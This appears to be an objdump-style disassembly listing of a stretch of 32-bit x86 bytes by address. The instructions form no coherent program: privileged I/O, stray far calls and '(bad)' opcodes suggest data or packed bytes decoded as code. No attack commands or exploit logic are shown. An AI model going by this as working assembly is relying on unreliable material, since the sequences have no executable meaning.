  4207f1:	in     al,dx
  4207f2:	loop   0x4207bd
  4207f4:	in     eax,0xb6
  4207f6:	hlt    
  4207f7:	mov    ds:0xbe4d3a92,eax
  4207fc:	ret    
  4207fd:	dec    edi
  4207fe:	and    BYTE PTR [esi],ch
  420800:	cdq    
  420801:	fs adc ebp,eax
  420804:	jae    0x4207f5
  420806:	inc    ebx
  420807:	loope  0x420825
  420809:	jb     0x4207c3
  42080b:	inc    ecx
  42080c:	push   ss
  42080d:	xchg   BYTE PTR [edx-0x61],cl
  420810:	call   0xbb92:0x729ca830
  420817:	pop    ss
  420818:	jo     0x42087b
  42081a:	daa    
  42081b:	jge    0x420806
  42081d:	fs xchg edx,eax
  42081f:	or     bl,BYTE PTR ss:[esi+0x5a453403]
  420826:	push   ecx
  420827:	sub    BYTE PTR [ecx+ebp*4+0x74f5f488],ah
  42082e:	mov    al,ds:0xd52d0fcc
  420833:	test   al,0x4c
  420835:	in     eax,0x54
  420837:	mov    eax,ds:0xc039b959
  42083c:	shr    DWORD PTR [ecx],1
  42083e:	not    DWORD PTR [edi+edx*1-0x27172a65]
  420845:	mov    cl,0x19
  420847:	aam    0xb5
  420849:	push   es
  42084a:	hlt    
  42084b:	pop    eax
  42084c:	sbb    DWORD PTR [ebp+0x2],esp
  42084f:	xchg   ebp,eax
  420850:	imul   ebx,ebp,0x1084c21a
  420856:	jl     0x420884
  420858:	rcl    BYTE PTR [eax+0x2f],0xc7
  42085c:	xchg   ebx,eax
  42085d:	repnz imul ebx,DWORD PTR [ecx+0x20],0xa91f1f73
  420865:	nop
  420866:	inc    esp
  420867:	xchg   esp,eax
  420868:	mov    WORD PTR [edx+0x18841919],es
  42086e:	push   esp
  42086f:	jae    0x420895
  420871:	int    0x85
  420873:	outs   dx,DWORD PTR ds:[esi]
  420874:	fisubr DWORD PTR [ebp+0x7c]
  420877:	push   esp
  420878:	push   es
  420879:	loop   0x4207fc
  42087b:	push   edx
  42087c:	push   cs
  42087d:	xchg   BYTE PTR [eax-0x7fd3b4f8],dh
  420883:	lods   eax,DWORD PTR ds:[esi]
  420884:	aaa    
  420885:	ins    DWORD PTR es:[edi],dx
  420886:	dec    ebp
  420887:	add    al,0x16
  420889:	imul   esi,DWORD PTR [ebx],0xdb1337b4
  42088f:	push   0x40
  420891:	xor    BYTE PTR [eax+0x59c9ee48],cl
  420897:	mov    esp,0x1c9bf0d7
  42089c:	nop
  42089d:	dec    ch
  42089f:	dec    eax
  4208a0:	fimul  DWORD PTR [edi]
  4208a2:	ins    BYTE PTR es:[edi],dx
  4208a3:	(bad)
  4208a6:	gs push 0xdf5a7b75
  4208ac:	aad    0x10
  4208ae:	sahf   
  4208af:	mov    ds:0x55343a57,al
  4208b4:	add    ah,bh
  4208b6:	cmovnp edx,edi
  4208b9:	stc    
  4208ba:	fmul   QWORD PTR [ecx+0x29]
  4208bd:	in     al,0x9b
  4208bf:	fiadd  DWORD PTR ds:0x413cb72
  4208c6:	xor    bh,BYTE PTR [esi+0x14]
  4208c9:	jl     0x42092b
  4208cb:	xchg   edx,eax
  4208cc:	cmp    BYTE PTR [edi+0x2d],al
  4208cf:	sub    eax,0x8295f71a
  4208d4:	or     eax,DWORD PTR [ecx+0x17d1e2ed]
  4208da:	dec    ebp
  4208db:	push   esp
  4208dc:	push   es
  4208dd:	ds jnp 0x42087d
  4208e0:	adc    eax,0x925685b4
  4208e5:	loopne 0x42086d
  4208e7:	lock inc edi
  4208e9:	iret   
  4208ea:	mov    WORD PTR [ecx+0x65],ss
  4208ed:	pop    esp
  4208ee:	jmp    0xbb3d1907
  4208f3:	pop    ds
  4208f4:	or     ah,bh
  4208f6:	mov    bh,0x72
  4208f8:	test   BYTE PTR [edx-0x4202665a],ch
  4208fe:	sbb    eax,0xf7bcb695
  420903:	push   ebx
  420904:	cli    
  420905:	and    ah,al
  420907:	(bad)  
  420908:	aad    0x2a
  42090a:	push   ebx
  42090b:	repz lea esp,[ebx+0x5b]
  42090f:	outs   dx,DWORD PTR ds:[esi]
  420910:	jb     0x4208df
  420912:	rcr    BYTE PTR es:[ebp+0x7e],1
  420916:	stos   BYTE PTR es:[edi],al
  420917:	ja     0x4208c6
  420919:	ficom  WORD PTR [edx+0x4e]
  42091c:	jb     0x42093a
  42091e:	mov    bl,0x72
  420920:	adc    DWORD PTR [ebx+0x1192d7b8],ecx
  420926:	nop
  420927:	scas   eax,DWORD PTR es:[edi]
  420928:	jmp    0x420916
  42092a:	xchg   edx,eax
  42092b:	cli    
  42092c:	mov    edi,0xef95c7fc
  420931:	je     0x42099b
  420933:	adc    eax,0x5a4b45c1
  420938:	mov    ecx,0x77a5086
  42093d:	sbb    BYTE PTR [edi-0x80],bl
  420940:	pop    es
  420941:	and    eax,0x556deab0
  420946:	ror    BYTE PTR [ebx],1
  420948:	shl    DWORD PTR [ebx+ebp*4+0x62],1
  42094c:	pop    ds
  42094d:	repnz sbb DWORD PTR [esi+esi*2+0x6d],esp
  420952:	jo     0x4209c1
  420954:	mov    bl,0xfe
  420956:	add    al,0x7c
  420958:	ret    0x16ce
  42095b:	fwait
  42095c:	push   ecx
  42095d:	adc    al,0x48
  42095f:	sub    BYTE PTR [edi+0x1a5bd417],0xed
  420966:	call   0xc89e6bd4
  42096b:	push   esp
  42096c:	mov    esp,0x9b6b36e4
  420971:	mov    cl,0x65
  420973:	retf   
  420974:	test   al,0xae
  420976:	jge    0x4209e0
  420978:	adc    al,0x22
  42097a:	sub    BYTE PTR [ecx+esi*8],dh
  42097d:	scas   eax,DWORD PTR es:[edi]
  42097e:	and    BYTE PTR [esi+ebx*1-0x3ec4403a],0xed
  420986:	fldenv [edx-0x4]
  420989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42098a:	fwait
  42098b:	out    dx,eax
  42098c:	(bad)  
  42098d:	push   cs
  42098e:	push   ss
  42098f:	and    ecx,DWORD PTR [ecx+0x77]
  420992:	imul   ebp,DWORD PTR [ebp+0x4ee70726],0xb9ec928e
  42099c:	fisubr WORD PTR [ebx]
  42099e:	das    
  42099f:	sub    DWORD PTR [ecx-0x21],0xffffffe4
  4209a3:	(bad)  
  4209a4:	cmp    esp,DWORD PTR [ebx]
  4209a6:	jbe    0x42093b
  4209a8:	in     al,0xcf
  4209aa:	or     al,0x36
  4209ac:	xchg   ebp,eax
  4209ad:	jbe    0x420959
  4209af:	jmp    0x2b1d6937
  4209b4:	ds pop edi
  4209b6:	call   0x503d22df
  4209bb:	lds    edi,FWORD PTR [eax+0x3]
  4209be:	hlt    
  4209bf:	jmp    0x3187:0x52c56ff2
  4209c6:	test   ebp,0xcb07cdb7
  4209cc:	aam    0xe5
  4209ce:	or     esi,DWORD PTR [ebp+0x6788ddcf]
  4209d4:	cmp    al,0xa9
  4209d6:	loope  0x4209f9
  4209d8:	call   0x75fc:0x87536f57
  4209df:	pop    esi
  4209e0:	out    0xbf,eax
  4209e2:	sbb    al,BYTE PTR [ebx-0x18b0076e]
  4209e8:	xlat   BYTE PTR ds:[ebx]
  4209e9:	jge    0x4209b6
  4209eb:	dec    ecx
  4209ec:	fsubr  DWORD PTR [ecx+0x70]
  4209ef:	data16 adc BYTE PTR [esp+0x5],0x59
  4209f5:	adc    al,0xb5
  4209f7:	mov    esi,0x3333845c
  4209fc:	inc    edx
  4209fd:	repz shr DWORD PTR [ecx],1
  420a00:	mov    al,ds:0x9e75b23d
  420a05:	or     esi,esi
  420a07:	mov    al,dh
  420a09:	ret    
  420a0a:	mov    BYTE PTR [ecx],bl
  420a0c:	inc    ecx
  420a0d:	dec    ecx
  420a0e:	mov    bl,0xdd
  420a10:	lods   eax,DWORD PTR ds:[esi]
  420a11:	mov    ah,0xf7
  420a13:	fadd   st,st(5)
  420a15:	(bad)  
  420a16:	imul   esi,DWORD PTR ds:0xa4fcfc3f,0xa
  420a1d:	enter  0x97a8,0x69
  420a21:	jo     0x4209e1
  420a23:	imul   esi,edi,0xfa9afaf9
  420a29:	test   esi,ebx
  420a2b:	mov    DWORD PTR [eax],ebx
  420a2d:	sbb    al,BYTE PTR ds:0xcae54ea0
  420a33:	push   DWORD PTR [edi+0x7]
  420a36:	dec    edx
  420a37:	popa   
  420a38:	inc    ebp
  420a39:	stc    
  420a3a:	outs   dx,BYTE PTR ds:[esi]
  420a3b:	push   esp
  420a3c:	pop    ss
  420a3d:	pop    eax
  420a3e:	push   ds
  420a3f:	push   esp
  420a40:	jb     0x420a2a
  420a42:	mov    dh,0x13
  420a44:	jmp    0x23fdb868
  420a49:	inc    ecx
  420a4a:	div    al
  420a4c:	jns    0x420aae
  420a4e:	stc    
  420a4f:	pushf  
  420a50:	mov    bh,0xa3
  420a52:	xor    DWORD PTR [eax+0xa],0xee3a00c0
  420a59:	(bad)  
  420a5a:	scas   eax,DWORD PTR es:[edi]
  420a5b:	retf   0x7963
  420a5e:	dec    esi
  420a5f:	int3   
  420a60:	adc    DWORD PTR [eax-0x2ecafd4c],ebx
  420a66:	jge    0x420ad5
  420a68:	xchg   BYTE PTR [ebp+0x71618040],al
  420a6e:	add    esp,DWORD PTR [edi]
  420a70:	call   0xd01:0x5c461764
  420a77:	or     dh,BYTE PTR [edx]
  420a79:	mov    BYTE PTR [ebx],bl
  420a7b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a7d:	jbe    0x420a80
  420a7f:	cld    
  420a80:	mov    esi,0x3116f706
  420a85:	jmp    0xe3a93331
  420a8a:	push   edi
  420a8b:	and    bl,BYTE PTR [ebx]
  420a8d:	pop    ds
  420a8e:	sub    BYTE PTR gs:[eax+0x78],bh
  420a92:	sub    eax,0xb016cdad
  420a97:	ins    BYTE PTR es:[edi],dx
  420a98:	arpl   WORD PTR [esi+eax*8+0x63acb0c7],di
  420a9f:	push   edx
  420aa0:	xor    BYTE PTR [esi-0x1d],ah
  420aa3:	dec    esi
  420aa4:	aas    
  420aa5:	or     bl,cl
  420aa7:	pop    esi
  420aa8:	mov    dh,0xdc
  420aaa:	sbb    eax,0xa937b1e
  420aaf:	cmp    cl,BYTE PTR [ecx-0x32580b3e]
  420ab5:	and    cl,0xc8
  420ab8:	mov    al,dl
  420aba:	xor    eax,0x1a30e00e
  420abf:	inc    ebx
  420ac0:	cmp    al,0x78
  420ac2:	inc    edi
  420ac3:	cmp    eax,0xe49a4f01
  420ac8:	ins    BYTE PTR es:[edi],dx
  420ac9:	cmp    BYTE PTR [ecx],ah
  420acb:	and    BYTE PTR [ebx+0x77],bl
  420ace:	fimul  DWORD PTR [esi-0xc868132]
  420ad4:	push   ebx
  420ad5:	jbe    0x420acd
  420ad7:	mov    esp,0xb06b6d
  420adc:	jmp    0x420af4
  420ade:	addr16 push edx
  420ae0:	or     al,0xba
  420ae2:	popf   
  420ae3:	icebp  
  420ae4:	and    BYTE PTR [edi+0x66],bh
  420ae7:	xchg   ebp,eax
  420ae8:	mov    al,ds:0x16f348a2
  420aed:	popa   
  420aee:	daa    
  420aef:	sti    
  420af0:	cs mov edi,0xbfa21231
  420af6:	sub    BYTE PTR [esp+ecx*2],ch
  420af9:	test   al,0x16
  420afb:	push   eax
  420afc:	adc    bh,BYTE PTR [eax+eax*4]
  420aff:	iret   
  420b00:	in     eax,0xaf
  420b02:	(bad)
  420b05:	mov    edx,0x1f6f603d
  420b0a:	es ins BYTE PTR es:[edi],dx
  420b0c:	dec    esi
  420b0d:	icebp  
  420b0e:	das    
  420b0f:	(bad)  
  420b10:	sub    eax,0xda91755a
  420b15:	scas   eax,DWORD PTR es:[edi]
  420b16:	stos   DWORD PTR es:[edi],eax
  420b17:	and    eax,0x3522dcac
  420b1c:	int3   
  420b1d:	stos   DWORD PTR es:[edi],eax
  420b1e:	mov    ch,0xe8
  420b20:	mov    eax,0x7a74239
  420b25:	add    esi,edi
  420b27:	enter  0xeea7,0xb5
  420b2b:	mov    eax,0x8155259e
  420b30:	xor    eax,0xc297b33a
  420b35:	xor    esi,ebp
  420b37:	xor    DWORD PTR ds:0xc26e690a,ecx
  420b3d:	enter  0x8aad,0xdd
  420b41:	frstpm(287 only) 
  420b43:	and    al,0xfb
  420b45:	ja     0x420b63
  420b47:	(bad)  
  420b48:	mov    esi,0x4ec606b2
  420b4d:	ja     0x420b85
  420b4f:	mov    esi,0xfa5aa1f
  420b54:	js     0x420b6f
  420b56:	sub    BYTE PTR [edx-0x4eb5e194],bl
  420b5c:	jle    0x420bcc
  420b5e:	std    
  420b5f:	popf   
  420b60:	stos   DWORD PTR es:[edi],eax
  420b61:	stos   DWORD PTR es:[edi],eax
  420b62:	xchg   esp,eax
  420b63:	jmp    0x532a:0x98b8f474
  420b6a:	or     dl,dl
  420b6c:	test   DWORD PTR [eax],eax
  420b6e:	es mov eax,0x704dd008
  420b74:	inc    eax
  420b75:	cmp    eax,0x2f6bd6ca
  420b7a:	cmp    DWORD PTR [edi+ecx*2-0x3a],esp
  420b7e:	(bad)  
  420b7f:	xchg   ebx,eax
  420b80:	pop    ebx
  420b81:	sub    eax,0xc2446499
  420b86:	add    al,0x5e
  420b88:	adc    BYTE PTR [edx-0x4d5d7768],ah
  420b8e:	jnp    0x420b38
  420b90:	xor    DWORD PTR [edi-0x66],eax
  420b93:	and    DWORD PTR [esi+0x55],0xeb7e7b2f
  420b9a:	add    DWORD PTR [esi+eiz*8-0x46],esp
  420b9e:	retf   0x3c78
  420ba1:	(bad)  
  420ba2:	sub    eax,DWORD PTR [ebx+0x65]
  420ba5:	jae    0x420bac
  420ba7:	mov    ah,0x82
  420ba9:	push   ds
  420baa:	sti    
  420bab:	mov    BYTE PTR [ebp+0x9855b6a],bh
  420bb1:	xor    BYTE PTR [ecx-0x71e1c065],bh
  420bb7:	add    al,0x22
  420bb9:	xor    cl,ch
  420bbb:	mov    DWORD PTR [edx+edi*2-0x84797bf],ebx
  420bc2:	push   edx
  420bc3:	cmp    ebx,ebp
  420bc5:	in     al,0x12
  420bc7:	push   es
  420bc8:	jl     0x420bfe
  420bca:	push   ds
  420bcb:	clc    
  420bcc:	xchg   BYTE PTR [edx+esi*8],cl
  420bcf:	and    DWORD PTR ds:0xaca46342,esi
  420bd5:	lds    eax,FWORD PTR [esi]
  420bd7:	xchg   cl,cl
  420bd9:	xor    DWORD PTR [edi],ebp
  420bdb:	ja     0x420b97
  420bdd:	xor    BYTE PTR [edi],bl
  420bdf:	push   es
  420be0:	pushf  
  420be1:	fild   QWORD PTR [ebx]
  420be3:	stos   DWORD PTR es:[edi],eax
  420be4:	clc    
  420be5:	mov    WORD PTR [esi+0x28],ds
  420be8:	jb     0x420c5b
  420bea:	xor    edx,esp
  420bec:	push   ecx
  420bed:	(bad)  
  420bef:	mov    ?,WORD PTR [ecx]
  420bf1:	loop   0x420bcd
  420bf3:	xchg   esp,eax
  420bf4:	fsub   QWORD PTR [ebx]
  420bf6:	loop   0x420c62
  420bf8:	inc    esi
  420bf9:	fisub  WORD PTR [ecx+0x1943e1e4]
  420bff:	lods   al,BYTE PTR ds:[esi]
  420c00:	popa   
  420c01:	int    0x73
  420c03:	dec    esp
  420c04:	adc    esp,DWORD PTR [eax+0x5d]
  420c07:	dec    edx
  420c08:	push   0x73
  420c0a:	pop    esp
  420c0b:	aad    0x56
  420c0d:	xchg   ecx,eax
  420c0e:	add    eax,0x9de1b0c6
  420c13:	adc    eax,0xcf23708
  420c18:	push   ecx
  420c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c1a:	cmp    eax,0x770286d6
  420c1f:	and    BYTE PTR [edi-0x4b],bl
  420c22:	xchg   edx,eax
  420c23:	and    eax,0xc81285f
  420c28:	aam    0xb7
  420c2a:	in     eax,0x7c
  420c2c:	out    0x92,al
  420c2e:	arpl   ax,cx
  420c30:	jno    0x420cab
  420c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c33:	pop    edi
  420c34:	pop    edi
  420c35:	sbb    eax,0x9f935555
  420c3a:	cs (bad) 
  420c3c:	push   edx
  420c3d:	and    BYTE PTR [edx+0x6d],dl
  420c40:	cmc    
  420c41:	jno    0x420c34
  420c43:	inc    esi
  420c44:	lods   al,BYTE PTR ds:[esi]
  420c45:	add    al,BYTE PTR [ebp-0x6b8e867a]
  420c4b:	idiv   bl
  420c4d:	in     al,0x30
  420c4f:	popf   
  420c50:	ret    
  420c51:	out    dx,al
  420c52:	cdq    
  420c53:	mov    cl,0xab
  420c55:	mov    BYTE PTR [eax-0x14],dl
  420c58:	inc    ecx
  420c59:	mov    ds:0x6e3f380a,al
  420c5e:	adc    ecx,DWORD PTR [edi+0x5ef6166b]
  420c64:	and    edi,DWORD PTR [eax-0x448d247c]
  420c6a:	scas   al,BYTE PTR es:[edi]
  420c6b:	fcomp  QWORD PTR [esi+0x1d]
  420c71:	add    BYTE PTR [ecx],al
  420c73:	jge    0x420c4d
  420c75:	mov    ebp,0xfd65bdfc
  420c7a:	or     cl,BYTE PTR [ecx+0x3a20b857]
  420c80:	stos   DWORD PTR es:[edi],eax
  420c81:	xor    ecx,ecx
  420c83:	xchg   BYTE PTR [ecx],al
  420c85:	add    ah,dh
  420c87:	add    al,0x0
  420c89:	add    BYTE PTR [esi],ah
  420c8b:	sub    BYTE PTR [edx-0x5c742c29],0x7a
  420c92:	div    DWORD PTR [edx]
  420c94:	loopne 0x420c8b
  420c96:	scas   eax,DWORD PTR es:[edi]
  420c97:	fucomp st(2)
  420c99:	mov    bh,0xf3
  420c9b:	out    0x6f,al
  420c9d:	add    BYTE PTR [ebx+0x4],0x99
  420ca1:	inc    eax
  420ca2:	int    0x76
  420ca4:	lds    edi,FWORD PTR [eax+edi*8]
  420ca7:	int3   
  420ca8:	dec    esp
  420ca9:	xor    eax,0x6a5113b9
  420cae:	mov    ds:0x35cea492,eax
  420cb3:	idiv   BYTE PTR [eax-0x50]
  420cb6:	dec    eax
  420cb7:	repnz or edx,DWORD PTR [esi]
  420cba:	jge    0x420cc4
  420cbc:	xchg   edi,eax
  420cbd:	cld    
  420cbe:	repnz mov ebp,0xb16bd5ac
  420cc4:	xchg   esi,eax
  420cc5:	mov    BYTE PTR [edi+0x43],al
  420cc8:	and    al,0xdb
  420cca:	cmp    eax,0x17e37af2
  420ccf:	bound  eax,QWORD PTR ds:0xe6851f8d
  420cd5:	inc    ecx
  420cd6:	jmp    0x420c94
  420cd8:	and    dl,BYTE PTR [esp+edx*2]
  420cdb:	pushf  
  420cdc:	call   0x3356:0x7ce9e311
  420ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ce4:	into   
  420ce5:	cmc    
  420ce6:	push   esp
  420ce7:	mov    ch,0x49
  420ce9:	jl     0x420d35
  420ceb:	ins    BYTE PTR es:[edi],dx
  420cec:	bts    DWORD PTR [eax-0x6ebeb148],ecx
  420cf3:	rcl    DWORD PTR [edi+0x7e],1
  420cf6:	lods   al,BYTE PTR ds:[esi]
  420cf7:	sub    ah,dh
  420cf9:	test   DWORD PTR [eax+eiz*2-0x61],esp
  420cfd:	hlt    
  420cfe:	adc    DWORD PTR [esp+edi*4],edx
  420d01:	ficomp DWORD PTR [esi]
  420d03:	jne    0x420cf7
  420d05:	xor    eax,0x254ca25f
  420d0a:	pop    ebx
  420d0b:	pop    ds
  420d0c:	cmp    DWORD PTR [esi+edx*1],ebp
  420d0f:	mov    dl,0xc0
  420d11:	pop    ebp
  420d12:	out    0xc3,al
  420d14:	into   
  420d15:	fnstsw WORD PTR [esi]
  420d17:	push   esp
  420d18:	scas   al,BYTE PTR es:[edi]
  420d19:	mov    ch,0xa3
  420d1b:	pop    ss
  420d1c:	das    
  420d1d:	xor    BYTE PTR [ecx+0x70],cl
  420d20:	adc    BYTE PTR [ecx-0x4c],dh
  420d23:	xchg   BYTE PTR [edi+0x23],ch
  420d26:	jmp    DWORD PTR [ebx]
  420d28:	push   ds
  420d29:	inc    ebp
  420d2a:	pop    esp
  420d2b:	jle    0x351f6c9f
  420d31:	div    cl
  420d33:	ins    DWORD PTR es:[edi],dx
  420d34:	jmp    0x9d0c:0x43f9dc5d
  420d3b:	out    dx,al
  420d3c:	les    eax,FWORD PTR [ecx-0x1c]
  420d3f:	mul    BYTE PTR [edx+edx*4]
  420d42:	sti    
  420d43:	pand   mm0,QWORD PTR [edi+edi*4-0x2]
  420d48:	xor    al,0x70
  420d4a:	test   ch,al
  420d4c:	loopne 0x420d55
  420d4e:	test   al,0xd9
  420d50:	adc    dh,BYTE PTR [edi+edx*4]
  420d53:	push   0xfffffff0
  420d55:	sub    BYTE PTR [edx],dh
  420d57:	leave  
  420d58:	jecxz  0x420d22
  420d5a:	fcmovnb st,st(6)
  420d5c:	dec    esi
  420d5d:	jne    0x420dba
  420d5f:	aam    0xf4
  420d61:	or     al,0x9a
  420d63:	add    DWORD PTR [eax-0x71272f7f],0x5164879d
  420d6d:	jo     0x420d5e
  420d6f:	or     cl,BYTE PTR [esi+0x2f1ffe94]
  420d75:	add    ecx,ecx
  420d77:	in     al,dx
  420d78:	cmp    ebx,DWORD PTR [ebx+0x33]
  420d7b:	stos   DWORD PTR es:[edi],eax
  420d7c:	mov    ds:0xd830b3d9,al
  420d81:	jnp    0x420dc4
  420d83:	dec    ebx
  420d84:	pop    ebp
  420d85:	sahf   
  420d86:	push   ecx
  420d87:	mov    bl,0x33
  420d89:	retf   
  420d8a:	adc    BYTE PTR [eax],0x21
  420d8d:	dec    esp
  420d8e:	adc    eax,0x3a5f44e9
  420d93:	xchg   edx,eax
  420d94:	(bad)  
  420d95:	jb     0x420d3d
  420d97:	aas    
  420d98:	sbb    DWORD PTR [esi],ebp
  420d9a:	fcomp  QWORD PTR [ebx+edx*1+0x4bdf6e25]
  420da1:	rol    ch,0x63
  420da4:	push   esi
  420da5:	and    BYTE PTR [ecx-0x12f5a54e],dl
  420dab:	sqrtps xmm1,xmm1
  420dae:	add    DWORD PTR [ecx+0x7cfc7d4b],ebp
  420db4:	stos   BYTE PTR es:[edi],al
  420db5:	cs pop esi
  420db7:	add    al,al
  420db9:	jb     0x420df3
  420dbb:	ja     0x420e22
  420dbd:	imul   edi,DWORD PTR [edx],0x58a8b16d
  420dc3:	and    edx,ecx
  420dc5:	test   ebx,edx
  420dc7:	sub    eax,DWORD PTR [ebx+0x3d6a3234]
  420dcd:	jg     0x420e1a
  420dcf:	and    DWORD PTR [ecx],ecx
  420dd1:	jns    0x420d8a
  420dd3:	adc    DWORD PTR [ebx-0x50],eax
  420dd6:	cmp    BYTE PTR [edx],bh
  420dd8:	gs call 0x1e69:0xac7a
  420ddf:	inc    DWORD PTR [ebp-0x22bee78f]
  420de5:	ret    
  420de6:	outs   dx,BYTE PTR ds:[esi]
  420de7:	jbe    0x420dcd
  420de9:	pop    esp
  420dea:	cmp    al,0x18
  420dec:	sbb    eax,0x3cec1da5
  420df1:	push   ds
  420df2:	fnstenv [ebp-0x24]
  420df5:	test   al,0x50
  420df7:	push   0x1c
  420df9:	xchg   ebp,eax
  420dfa:	xlat   BYTE PTR ds:[ebx]
  420dfb:	and    BYTE PTR [ebx-0x5c],dh
  420dfe:	mov    ecx,esi
  420e00:	daa    
  420e01:	or     al,0x67
  420e03:	add    esi,DWORD PTR [edi*8+0x78befe7f]
  420e0a:	or     DWORD PTR [edx+0x57354eff],eax
  420e10:	(bad)  
  420e11:	pop    edi
  420e12:	test   BYTE PTR [ebx-0x782cce5e],al
  420e18:	jg     0x420e32
  420e1a:	or     al,0xb0
  420e1c:	inc    esi
  420e1d:	es mov al,0xcb
  420e20:	jae    0x420dac
  420e22:	and    bh,BYTE PTR [edx+0xc4a0be9]
  420e28:	mov    ch,0x6e
  420e2a:	out    0x1b,eax
  420e2c:	cs mov ebp,0xd3922595
  420e32:	pop    esi
  420e33:	dec    ecx
  420e34:	rcr    DWORD PTR [esi],1
  420e36:	cdq    
  420e37:	cwde   
  420e38:	outs   dx,DWORD PTR ds:[esi]
  420e39:	repnz mov al,0x3f
  420e3c:	call   0x421eaf59
  420e41:	das    
  420e42:	xchg   ebp,eax
  420e43:	pop    esi
  420e44:	ror    BYTE PTR [edi+0x2b29cce8],0xf5
  420e4b:	push   ebx
  420e4c:	push   eax
  420e4d:	pop    eax
  420e4e:	out    dx,eax
  420e4f:	xor    BYTE PTR [esp+eiz*4+0x62ba40dd],bl
  420e56:	test   eax,0xb02401cd
  420e5b:	sub    edi,0x6a1e14b9
  420e61:	inc    eax
  420e62:	push   ebx
  420e63:	mov    ch,0xcd
  420e65:	push   ecx
  420e66:	leave  
  420e67:	jecxz  0x420e29
  420e69:	sub    esi,DWORD PTR [edx-0x1c03addb]
  420e6f:	xor    cl,BYTE PTR [ebx]
  420e71:	xor    BYTE PTR [ebp+0x33a09db6],bh
  420e77:	mov    eax,0xd31b5c82
  420e7c:	nop
  420e7d:	cwde   
  420e7e:	push   edi
  420e7f:	push   edx
  420e80:	test   DWORD PTR [esp+edi*2+0x3f],edi
  420e84:	std    
  420e85:	mov    al,ds:0xd5fdba70
  420e8a:	xor    eax,DWORD PTR [eax+ebx*1+0x23]
  420e8e:	dec    ebx
  420e8f:	das    
  420e90:	and    ch,BYTE PTR [eax+0x4b65995b]
  420e96:	fwait
  420e97:	mov    al,0x12
  420e99:	inc    edx
  420e9a:	mov    eax,ds:0xfe1c406d
  420e9f:	mov    ds:0x5f5dabe9,eax
  420ea4:	leave  
  420ea5:	push   esi
  420ea6:	test   BYTE PTR gs:[eax-0x7cdcd4ac],bl
  420ead:	xlat   BYTE PTR ds:[ebx]
  420eae:	jmp    0x420edc
  420eb0:	out    0xeb,al
  420eb2:	adc    dl,al
  420eb4:	fchs   
  420eb6:	out    dx,al
  420eb7:	fsubrp st(7),st
  420eb9:	not    DWORD PTR gs:[ecx-0x40]
  420ebd:	add    BYTE PTR [edi+ecx*8],dl
  420ec0:	mov    bh,0xf2
  420ec2:	xor    eax,0x1691354a
  420ec7:	js     0x420ee3
  420ec9:	test   BYTE PTR [esp+edi*1-0x5964798e],bh
  420ed0:	jle    0x420f3f
  420ed2:	adc    bh,BYTE PTR [ecx+0x4a444341]
  420ed8:	and    eax,0xce08373b
  420edd:	jmp    0x420f49
  420edf:	leave  
  420ee0:	or     ecx,esi
  420ee2:	sub    BYTE PTR ds:0x44d60c7c,bh
  420ee8:	int    0xd
  420eea:	fbld   TBYTE PTR [eax+0x69]
  420eed:	adc    eax,0x94207f24
  420ef2:	xchg   esi,eax
  420ef3:	cmp    esp,DWORD PTR [ebx]
  420ef5:	das    
  420ef6:	sub    eax,0xdb56a0bd
  420efb:	aad    0x3a
  420efd:	mov    edi,0x446532d8
  420f02:	adc    ecx,DWORD PTR [ebx+0x28]
  420f05:	cmp    al,0xc
  420f07:	test   BYTE PTR [ebx+0x7b],dl
  420f0a:	mov    eax,ds:0xc620f10a
  420f0f:	jo     0x420f74
  420f11:	mov    edi,esi
  420f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f14:	jmp    ebp
  420f16:	mov    ebx,0xf9f2af24
  420f1b:	fcmovb st,st(6)
  420f1d:	cmp    eax,DWORD PTR [ebx-0x22b69852]
  420f23:	push   ss
  420f24:	or     DWORD PTR [ecx-0x4e],0x515e6bb5
  420f2b:	push   ebx
  420f2c:	hlt    
  420f2d:	mov    ah,0x9d
  420f2f:	mov    ah,0xb9
  420f31:	xchg   ecx,eax
  420f32:	xchg   ebp,eax
  420f33:	in     eax,dx
  420f34:	adc    BYTE PTR [edi+0x5945fc3b],ah
  420f3a:	(bad)  
  420f3b:	jns    0x420ee4
  420f3d:	and    bh,BYTE PTR [eax]
  420f3f:	repnz (bad) 
  420f41:	pop    eax
  420f42:	ins    BYTE PTR es:[edi],dx
  420f43:	cdq    
  420f44:	pop    ecx
  420f45:	fcomip st,st(2)
  420f47:	mov    al,0xd2
  420f49:	cmp    ebp,ebx
  420f4b:	fld    QWORD PTR [esi-0x6264085a]
  420f51:	mov    bl,0xb8
  420f53:	inc    esp
  420f54:	adc    esp,DWORD PTR [eax+eax*2]
  420f57:	mov    ecx,0xe08bfe9b
  420f5c:	loopne 0x420f22
  420f5e:	add    ch,ch
  420f60:	sub    bl,BYTE PTR [ebx]
  420f62:	mov    edi,DWORD PTR ds:0x5c5d3006
  420f68:	sbb    eax,0x103677cf
  420f6d:	stos   DWORD PTR es:[edi],eax
  420f6e:	popa   
  420f6f:	into   
  420f70:	jmp    0x68a1ba2e
  420f75:	cdq    
  420f76:	push   ss
  420f77:	call   0xb356:0x6de9db09
  420f7e:	loopne 0x420f12
  420f80:	jnp    0x420fec
  420f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f83:	mov    ebp,0x7d1938aa
  420f88:	fld    TBYTE PTR [esi]
  420f8a:	cmp    eax,0x1f27afed
  420f8f:	arpl   WORD PTR [edi+0x2848f6d0],dx
  420f95:	(bad)  
  420f96:	xchg   ebp,eax
  420f97:	outs   dx,BYTE PTR ds:[esi]
  420f98:	add    DWORD PTR [edx],esi
  420f9a:	xor    DWORD PTR [ebp+0x9],0x78
  420f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f9f:	icebp  
  420fa0:	inc    BYTE PTR ds:0x7e79a7e0
  420fa6:	mov    ecx,gs
  420fa8:	mov    esp,0xb59d8edb
  420fad:	xor    dh,BYTE PTR [ecx-0x697ba1d5]
  420fb3:	retf   0x5db0
  420fb6:	test   DWORD PTR [ebp-0x2c11fa83],0xa3d3aab3
  420fc0:	pop    ebx
  420fc1:	cli    
  420fc2:	es adc al,0x6
  420fc5:	fst    QWORD PTR [esi-0x6b57e4b0]
  420fcb:	mov    ah,BYTE PTR [esp+edi*4-0x70a3be9c]
  420fd2:	inc    ecx
  420fd3:	pushf  
